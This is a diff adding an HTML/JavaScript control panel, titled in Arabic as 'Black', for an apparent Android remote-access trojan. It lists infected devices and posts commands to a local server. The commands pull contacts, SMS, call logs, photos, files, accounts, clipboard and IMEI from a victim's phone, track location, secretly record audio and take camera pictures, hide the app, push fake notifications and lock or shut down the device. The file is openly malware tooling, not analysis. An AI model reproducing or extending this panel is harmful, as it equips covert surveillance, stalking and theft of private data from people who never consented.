@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔱 بلاك - التحكم</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+        body{background:#0a0a0a;color:#fff;padding:15px}
+        .header{background:linear-gradient(135deg,#dc2626,#991b1b);padding:15px;border-radius:15px;text-align:center;margin-bottom:15px}
+        .header h1{font-size:20px}
+        .device-list{background:#1a1a2e;border-radius:15px;padding:15px;margin-bottom:15px}
+        .device-item{padding:12px;border:1px solid #333;border-radius:10px;margin-bottom:5px;cursor:pointer;display:flex;justify-content:space-between;align-items:center}
+        .device-item.active{border-color:#ef4444;background:#2a0a0a}
+        .device-item .status{font-size:12px;color:#22c55e}
+        .controls-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px}
+        .ctrl-btn{padding:10px;border:1px solid #333;border-radius:10px;text-align:center;cursor:pointer;background:#0d0d1a;font-size:11px;transition:.2s}
+        .ctrl-btn:hover{border-color:#ef4444;background:#1a0a0a}
+        .ctrl-btn .icon{font-size:18px;display:block;margin-bottom:4px}
+        .log{background:#0d0d1a;padding:10px;border-radius:10px;margin-top:15px;max-height:150px;overflow-y:auto;font-family:monospace;font-size:11px;color:#22c55e}
+        .log .time{color:#666}
+        .selected-device{color:#ef4444;font-weight:bold;font-size:14px;text-align:center;padding:10px;background:#1a0a0a;border-radius:10px;margin-bottom:10px;border:1px solid #ef4444}
+        .data-display{background:#0d0d1a;padding:10px;border-radius:10px;margin-top:10px;max-height:200px;overflow-y:auto;font-size:12px;color:#fff;white-space:pre-wrap;word-break:break-all;display:none;border:1px solid #333}
+        .data-display.show{display:block}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔱 بلاك - لوحة التحكم</h1>
+    </div>
+
+    <div id="selectedDisplay" class="selected-device">⚠️ لم يتم اختيار جهاز</div>
+
+    <div class="device-list">
+        <h3>📱 الأجهزة المتصلة</h3>
+        <div id="devices"></div>
+    </div>
+
+    <div class="controls-grid" id="controls">
+        <div class="ctrl-btn" onclick="sendCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_location')"><span class="icon">📍</span>الموقع</div>
+        <div class="ctrl-btn" onclick="sendCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
+        <div class="ctrl-btn" onclick="sendCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_files')"><span class="icon">📦</span>الملفات</div>
+        <div class="ctrl-btn" onclick="sendCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء</div>
+        <div class="ctrl-btn" onclick="sendCmd('show_app')"><span class="icon">👁</span>إظهار</div>
+        <div class="ctrl-btn" onclick="sendCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
+        <div class="ctrl-btn" onclick="sendCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
+        <div class="ctrl-btn" onclick="sendCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
+        <div class="ctrl-btn" onclick="sendCmd('flash_on')"><span class="icon">🔦</span>كشاف ON</div>
+        <div class="ctrl-btn" onclick="sendCmd('flash_off')"><span class="icon">🔦</span>كشاف OFF</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_imei')"><span class="icon">📟</span>IMEI</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_sim')"><span class="icon">📡</span>معلومات SIM</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_ip')"><span class="icon">🌐</span>IP العام</div>
+        <div class="ctrl-btn" onclick="sendCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
+        <div class="ctrl-btn" onclick="sendCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
+        <div class="ctrl-btn" onclick="sendCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
+        <div class="ctrl-btn" onclick="sendCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
+        <div class="ctrl-btn" onclick="sendCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_packages')"><span class="icon">📦</span>التطبيقات المثبتة</div>
+        <div class="ctrl-btn" onclick="sendCmd('get_processes')"><span class="icon">🔄</span>العمليات الجارية</div>
+    </div>
+
+    <div class="data-display" id="dataDisplay"></div>
+
+    <div class="log" id="log">[+] النظام جاهز</div>
+
+    <script>
+        let selectedDevice = null;
+        let devices = {};
+
+        function sendCmd(cmd) {
+            if (!selectedDevice) {
+                log('⚠️ اختر جهازاً أولاً');
+                return;
+            }
+            log('📤 أمر مرسل: ' + cmd + ' → ' + selectedDevice);
+            fetch('http://localhost:8080', {
+                method: 'POST',
+                headers: {'Content-Type': 'text/plain'},
+                body: 'CMD:' + cmd + '|' + selectedDevice
+            });
+        }
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('ar-SA');
+            el.innerHTML += '\n<span class="time">[' + time + ']</span> ' + msg;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function showData(data) {
+            const el = document.getElementById('dataDisplay');
+            el.textContent = data;
+            el.classList.add('show');
+            log('📥 بيانات واردة');
+        }
+
+        function addDevice(data) {
+            try {
+                const info = JSON.parse(data);
+                devices[info.device_id] = info;
+                updateDevices();
+                log('📱 جهاز جديد: ' + info.device_name);
+            } catch(e) {
+                log('❌ خطأ في تسجيل الجهاز');
+            }
+        }
+
+        function updateDevices() {
+            const container = document.getElementById('devices');
+            container.innerHTML = '';
+            for (let id in devices) {
+                const div = document.createElement('div');
+                div.className = 'device-item' + (selectedDevice === id ? ' active' : '');
+                div.innerHTML = '<span>📱 ' + devices[id].device_name + '</span><span class="status">🟢 متصل</span>';
+                div.onclick = () => {
+                    selectedDevice = id;
+                    document.getElementById('selectedDisplay').textContent = '🎯 الجهاز المحدد: ' + devices[id].device_name;
+                    updateDevices();
+                };
+                container.appendChild(div);
+            }
+        }
+
+        setTimeout(() => {
+            addDevice(JSON.stringify({
+                device_id: 'TEST_DEVICE_001',
+                device_name: 'هاتف اختبار',
+                model: 'Samsung',
+                android: '14'
+            }));
+        }, 2000);
+
+        log('✅ لوحة التحكم جاهزة');
+    </script>
+</body>
+</html>
